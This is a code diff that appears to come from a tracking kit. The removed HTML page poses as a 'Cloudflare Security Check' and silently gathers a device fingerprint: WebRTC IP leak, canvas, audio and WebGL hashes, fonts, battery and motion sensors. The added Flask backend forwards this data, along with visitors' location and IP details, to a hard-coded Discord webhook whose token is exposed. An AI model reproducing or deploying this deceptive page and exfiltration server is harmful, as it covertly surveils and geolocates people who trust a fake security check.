@@ -1,460 +1,121 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare Security Check</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            padding: 40px;
-            max-width: 500px;
-            width: 90%;
-            text-align: center;
-        }
-        .cf-logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-        h1 {
-            color: #2d3748;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            color: #718096;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #f6821f;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
-            color: #4a5568;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-        .check-mark {
-            color: #48bb78;
-            font-size: 60px;
-            display: none;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container" id="container">
-        <div class="cf-logo">🛡️</div>
-        <h1>Checking your browser security</h1>
-        <p class="subtitle">Verifying your connection is secure...</p>
-        
-        <div id="loader" class="loader"></div>
-        <div id="checkMark" class="check-mark">✅</div>
-        <p class="status" id="status">Running security checks...</p>
-    </div>
+from flask import Flask, request, jsonify, send_file
+import json
+import datetime
+import os
+import requests
+from pathlib import Path
 
-    <script>
-        // Collect all tracking data
-        async function collectData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                sessionId: getSessionId(),
-                url: window.location.href,
-                referrer: document.referrer || 'Direct',
-                
-                // Browser info
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                
-                // Screen
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio
-                },
-                
-                // CPU & Memory
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                
-                // Touch
-                touchPoints: navigator.maxTouchPoints || 0,
-                
-                // Timezone
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                
-                // Battery
-                battery: await getBatteryInfo(),
-                
-                // Network
-                networkInfo: await getNetworkInfo(),
-                
-                // Sensors (mobile)
-                motion: await getMotionData(),
-                
-                // WebRTC IP Leak
-                webRTCIPs: await getWebRTCIPs(),
-                
-                // Canvas Fingerprint
-                canvasFingerprint: getCanvasFingerprint(),
-                
-                // Audio Fingerprint
-                audioFingerprint: await getAudioFingerprint(),
-                
-                // WebGL Info
-                webgl: await getWebGLInfo(),
-                
-                // Fonts
-                fonts: getInstalledFonts(),
-                
-                // Plugins
-                plugins: getPlugins(),
-                
-                // Performance
-                performance: getPerformanceMetrics(),
-                
-                // Tab visibility
-                tabVisibility: getTabVisibility(),
-                
-                // History depth
-                historyDepth: history.length
-            };
-            
-            return data;
-        }
+app = Flask(__name__)
+
+# Your Discord webhook URL
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479678991911620629/UdXO8l8nzrRxljr4PhYQpxLtBT7dgOxr03mfRMC9pkaBQqeQmsghZX9VQPI_l8ZAiFXN"
+
+# Send data to Discord
+def send_to_discord(data):
+    """Send collected data to Discord webhook"""
+    
+    # Format the data nicely for Discord
+    embed = {
+        "title": "📍 New Tracking Data Received",
+        "color": 0x5865F2,  # Discord blue
+        "fields": [],
+        "footer": {"text": f"Session: {data.get('sessionId', 'unknown')}"},
+        "timestamp": datetime.datetime.utcnow().isoformat()
+    }
+    
+    # Add location info if available
+    location = data.get('location', {})
+    if location:
+        lat = location.get('latitude', 'N/A')
+        lng = location.get('longitude', 'N/A')
+        accuracy = location.get('accuracy', 'N/A')
+        maps_link = f"https://maps.google.com/?q={lat},{lng}"
         
-        // Helper functions
-        function getSessionId() {
-            let id = sessionStorage.getItem('tracker_session_id');
-            if (!id) {
-                id = Math.random().toString(36).substring(2, 10) + 
-                     Math.random().toString(36).substring(2, 10);
-                sessionStorage.setItem('tracker_session_id', id);
-            }
-            return id;
-        }
-        
-        async function getBatteryInfo() {
-            try {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                }
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        async function getNetworkInfo() {
-            try {
-                if ('connection' in navigator) {
-                    const conn = navigator.connection;
-                    return {
-                        type: conn.effectiveType || 'unknown',
-                        downlink: conn.downlink || 'unknown',
-                        rtt: conn.rtt || 'unknown'
-                    };
-                }
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        async function getMotionData() {
-            try {
-                return new Promise((resolve) => {
-                    if ('DeviceOrientationEvent' in window) {
-                        window.addEventListener('deviceorientation', function handler(e) {
-                            resolve({
-                                alpha: e.alpha || 0,
-                                beta: e.beta || 0,
-                                gamma: e.gamma || 0
-                            });
-                            window.removeEventListener('deviceorientation', handler);
-                        }, { once: true });
-                        setTimeout(() => resolve(null), 3000);
-                    } else {
-                        resolve(null);
-                    }
-                });
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        async function getWebRTCIPs() {
-            return new Promise((resolve) => {
-                try {
-                    const ips = [];
-                    const pc = new RTCPeerConnection({
-                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                    });
-                    
-                    pc.createDataChannel('test');
-                    pc.createOffer()
-                        .then(offer => pc.setLocalDescription(offer))
-                        .catch(() => {});
-                    
-                    pc.onicecandidate = (event) => {
-                        if (!event.candidate) {
-                            pc.close();
-                            resolve(ips.length ? ips : ['No local IPs found']);
-                            return;
-                        }
-                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ip && !ips.includes(ip[0])) {
-                            ips.push(ip[0]);
-                        }
-                    };
-                    
-                    setTimeout(() => {
-                        pc.close();
-                        resolve(ips.length ? ips : ['No local IPs found']);
-                    }, 3000);
-                } catch (e) {
-                    resolve(['WebRTC not supported']);
-                }
-            });
-        }
-        
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 256;
-                const ctx = canvas.getContext('2d');
-                
-                // Draw complex shapes
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 128, 128);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Hello World', 50, 50);
-                
-                // Get image data
-                const data = ctx.getImageData(0, 0, 256, 256).data;
-                let hash = 0;
-                for (let i = 0; i < data.length; i += 4) {
-                    hash = ((hash << 5) - hash) + data[i];
-                    hash = hash & hash;
-                }
-                return Math.abs(hash).toString(36);
-            } catch (e) {
-                return 'Canvas unavailable';
-            }
-        }
-        
-        async function getAudioFingerprint() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(audioCtx.destination);
-                oscillator.start(0);
-                
-                const dataArray = new Float32Array(analyser.frequencyBinCount);
-                analyser.getFloatFrequencyData(dataArray);
-                
-                let sum = 0;
-                for (let i = 0; i < dataArray.length; i++) {
-                    sum += dataArray[i];
-                }
-                
-                oscillator.stop();
-                audioCtx.close();
-                
-                return (sum / dataArray.length).toFixed(6);
-            } catch (e) {
-                return 'Audio unavailable';
-            }
-        }
-        
-        async function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return null;
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        function getInstalledFonts() {
-            const fonts = [
-                'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
-                'Verdana', 'Georgia', 'Palatino', 'Garamond',
-                'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS',
-                'Lucida Sans', 'Lucida Grande', 'Segoe UI', 'Roboto',
-                'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro',
-                'Raleway', 'Oswald', 'Merriweather', 'PT Sans',
-                'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans'
-            ];
-            
-            const installed = [];
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const baseSize = '72px';
-            const baseFont = 'monospace';
-            
-            fonts.forEach(font => {
-                ctx.font = baseSize + ' ' + font + ', ' + baseFont;
-                const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-                ctx.font = baseSize + ' ' + baseFont;
-                const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-                if (width1 !== width2) {
-                    installed.push(font);
-                }
-            });
-            
-            return installed;
-        }
-        
-        function getPlugins() {
-            try {
-                const plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    plugins.push(navigator.plugins[i].name);
-                }
-                return plugins;
-            } catch (e) {
-                return [];
-            }
-        }
-        
-        function getPerformanceMetrics() {
-            try {
-                const perf = performance.timing;
-                return {
-                    pageLoadTime: perf.loadEventEnd - perf.navigationStart,
-                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
-                    dns: perf.domainLookupEnd - perf.domainLookupStart,
-                    tcp: perf.connectEnd - perf.connectStart,
-                    ttfb: perf.responseStart - perf.navigationStart
-                };
-            } catch (e) {
-                return null;
-            }
-        }
-        
-        function getTabVisibility() {
-            let visibilityEvents = 0;
-            let startTime = Date.now();
-            
-            document.addEventListener('visibilitychange', () => {
-                visibilityEvents++;
-                if (document.hidden) {
-                    console.log('Tab hidden');
-                } else {
-                    console.log('Tab visible');
-                }
-            });
-            
-            return {
-                events: visibilityEvents,
-                timeSincePageLoad: Math.round((Date.now() - startTime) / 1000) + 's'
-            };
-        }
-        
-        // Send data to backend
-        async function sendData(data) {
-            try {
-                const response = await fetch('/track', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch (e) {
-                console.error('Error sending data:', e);
-                return null;
-            }
-        }
-        
-        // Main execution
-        async function main() {
-            const statusEl = document.getElementById('status');
-            const loaderEl = document.getElementById('loader');
-            const checkMarkEl = document.getElementById('checkMark');
-            
-            statusEl.textContent = 'Collecting device information...';
-            
-            // Collect data
-            const data = await collectData();
-            
-            // Send to backend
-            statusEl.textContent = 'Verifying your connection...';
-            const result = await sendData(data);
-            
-            if (result && result.status === 'success') {
-                loaderEl.style.display = 'none';
-                checkMarkEl.style.display = 'block';
-                statusEl.textContent = '✓ Connection verified! You can close this page.';
-                statusEl.style.color = '#48bb78';
-            } else {
-                statusEl.textContent = 'Connection verification failed. Please refresh.';
-                statusEl.style.color = '#fc8181';
-            }
-            
-            console.log('Data collected:', data);
-        }
-        
-        // Run
-        main();
-    </script>
-</body>
-</html>
+        embed["fields"].append({
+            "name": "📍 Location",
+            "value": f"**Lat/Lng:** {lat}, {lng}\n**Accuracy:** ±{accuracy}m\n[Google Maps]({maps_link})",
+            "inline": False
+        })
+    
+    # Add IP info
+    ip_info = data.get('ipInfo', {})
+    if ip_info:
+        embed["fields"].append({
+            "name": "🌐 IP Info",
+            "value": f"**IP:** {ip_info.get('ip', 'N/A')}\n**ISP:** {ip_info.get('isp', 'N/A')}\n**City:** {ip_info.get('city', 'N/A')}\n**Country:** {ip_info.get('country', 'N/A')}",
+            "inline": False
+        })
+    
+    # Add browser fingerprint
+    browser = data.get('browser', {})
+    if browser:
+        embed["fields"].append({
+            "name": "🖥️ Browser Fingerprint",
+            "value": f"**Platform:** {browser.get('platform', 'N/A')}\n**Screen:** {browser.get('screen', 'N/A')}\n**Language:** {browser.get('language', 'N/A')}\n**CPU Cores:** {browser.get('cpuCores', 'N/A')}",
+            "inline": False
+        })
+    
+    # Add WebRTC IP Leak
+    webrtc = data.get('webRTCIPs', [])
+    if webrtc:
+        embed["fields"].append({
+            "name": "🔓 WebRTC IP Leak",
+            "value": f"```{', '.join(webrtc)}```",
+            "inline": False
+        })
+    
+    # Add device info
+    device = data.get('device', {})
+    if device:
+        embed["fields"].append({
+            "name": "📱 Device Info",
+            "value": f"**Battery:** {device.get('battery', 'N/A')}\n**Network:** {device.get('network', 'N/A')}\n**Touch Points:** {device.get('touchPoints', 'N/A')}",
+            "inline": False
+        })
+    
+    # Send to Discord
+    payload = {
+        "content": "📊 **New visitor tracked!**",
+        "embeds": [embed],
+        "username": "CF Tracker Bot"
+    }
+    
+    try:
+        response = requests.post(DISCORD_WEBHOOK, json=payload)
+        return response.status_code == 204
+    except Exception as e:
+        print(f"Discord send error: {e}")
+        return False
+
+# Serve the main page
+@app.route('/')
+def serve_index():
+    return send_file('../static/index.html')
+
+# Receive tracking data
+@app.route('/track', methods=['POST'])
+def track_data():
+    data = request.json
+    
+    # Log to console
+    print(f"\n{'='*60}")
+    print(f"TRACKING DATA RECEIVED - {datetime.datetime.now()}")
+    print(f"{'='*60}")
+    print(json.dumps(data, indent=2))
+    print(f"{'='*60}\n")
+    
+    # Send to Discord
+    discord_sent = send_to_discord(data)
+    print(f"Discord webhook sent: {discord_sent}")
+    
+    return jsonify({
+        "status": "success",
+        "discord_sent": discord_sent
+    })
+
+# Health check
+@app.route('/health')
+def health():
+    return jsonify({"status": "healthy"})
+
+app = app
